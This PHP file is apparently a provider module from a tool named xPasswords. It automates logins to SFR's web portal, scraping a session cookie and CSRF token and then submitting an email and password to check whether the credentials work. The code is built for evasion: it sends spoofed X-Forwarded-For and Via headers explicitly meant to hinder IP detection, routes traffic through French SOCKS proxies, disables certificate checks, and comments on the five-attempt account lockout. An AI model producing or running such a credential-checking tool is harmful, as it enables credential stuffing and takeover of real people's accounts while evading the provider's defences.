<?php
namespace xPasswords\Providers;

class Sfr {
    
    static public $imapAddress = 'imaps://imap.sfr.fr:993';
    
    static public function authenticate($email, $password) {
        
        // Shared options
        $staticOptions = [
            'CSRF' => false,
            'Cookie' => false,
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];

        // STEP 1: GET COOKIES
        $request = \Requests::get('https://www.sfr.fr/cas/login?domain=mire-ec&service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check', [
            'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Origin' => 'https://www.sfr.fr',
        ], [
            'timeout' => 30, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
        
        // Parse Cookie var
        @preg_match('/^JSESSIONID=(.*?);/', $request->headers['Set-Cookie'], $staticOptions['Cookie']);
        $staticOptions['Cookie'] = trim(rtrim($staticOptions['Cookie'][0], ';'));
        if(empty($staticOptions['Cookie'])) {
            // Cookie empty
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Error while getting cookies.', ['red']);
            exit(255);
        }
        
        // Parse CSRF var
        $domLoad = new \DomDocument();
        $domLoad->loadHTML(trim($request->body));
        $xp = new \DOMXpath($domLoad);
        $staticOptions['CSRF'] = $xp->query('//*[@id="loginForm"]/input[@name="lt"]')->item(0)->getAttribute('value');
        if(empty($staticOptions['CSRF'])) {
            // CSRF empty
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Error while getting CSRF token.', ['red']);
            exit(255);
        }
        
        // Adding extra delay
        //\xPasswords\Core::sleep(0.5);
        if(defined('_DEBUG_MODE')) echo \xPasswords\Core::say('[INFO] [PROVIDER] Step 1 passed', ['blue']);
        
        // STEP 2: SEND CREDENTIALS TO SERVER
        // Pas de captcha mais à partir de 5 tentatives de login le compte se bloque
        $request = \Requests::post('https://www.sfr.fr/cas/login?domain=mire-ec&service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check', [
            // Try to spoof and make the IP detection more complex
            'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Referer' => 'https://www.sfr.fr/cas/login?service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check&sfrintid=P_head_ec',
            'Origin' => 'https://www.sfr.fr',
            'Cookie' => $staticOptions['Cookie'],
        ], [
            'lt' => $staticOptions['CSRF'],
            '_eventId' => 'submit',
            'username' => $email,
            'password' => $password,
            'Envoyer' => 'S\'identifier',
            'remember-me' => 'off',
            'identifier' => '',
        ], [
            'timeout' => 30, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
        
        // Free memory
        $staticOptions = NULL;

        switch($request->status_code) {
            
            case 302: // Authorized
            //  string(113) "https://www.sfr.fr/accueil/j_spring_cas_security_check?ticket=ST-25043256-ZfBlyq79e6EtpzWKadrr-authentification13"
            if(preg_match('/^https:\/\/www.sfr.fr\/accueil\/j_spring_cas_security_check\?ticket=(.*?)$/iu', $request->headers['location'])) {
                return true;
            }
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] SFR returned anormal URL location: ' . $request->headers['location'] . ' for ' . $email, ['color' => 'red']);
            return false;
            break;

            case 200: // Unauthorized
            return false;
            break;

            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] SFR returned anormal HTTP code: ' . $request->status_code . ' for ' . $email, ['color' => 'red']);
            break;
        }
        
        return false;
    }
};